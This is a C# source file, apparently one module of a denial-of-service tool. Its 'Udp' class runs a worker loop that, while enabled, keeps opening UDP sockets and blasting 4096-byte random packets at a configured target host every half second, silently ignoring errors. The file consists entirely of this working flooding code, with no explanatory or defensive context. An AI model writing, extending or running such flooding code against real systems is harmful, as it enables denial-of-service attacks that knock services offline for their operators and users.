using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;


    class Udp
    {
        public static IPEndPoint Host;
        public static bool IsEnabled;
        public static int socketsPerThread = 3;

        public static void WorkerThread()
        {
            List<Socket> connectionList = new List<Socket>();

            for (int i = 0; i <= socketsPerThread - 1; i++)
            {
                Socket tempClient = null;
                connectionList.Add(tempClient);
            }

            while (IsEnabled)
            {
                for (int i = 0; i <= socketsPerThread - 1; i++)
                {
                    try
                    {
                        connectionList[i] = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
                        connectionList[i].SendTo(Tools.GenerateRandomPacket(4096), Host);
                    }
                    catch
                    {
                    }
                }
                Thread.Sleep(500);
                GC.Collect();
            }
        }
    }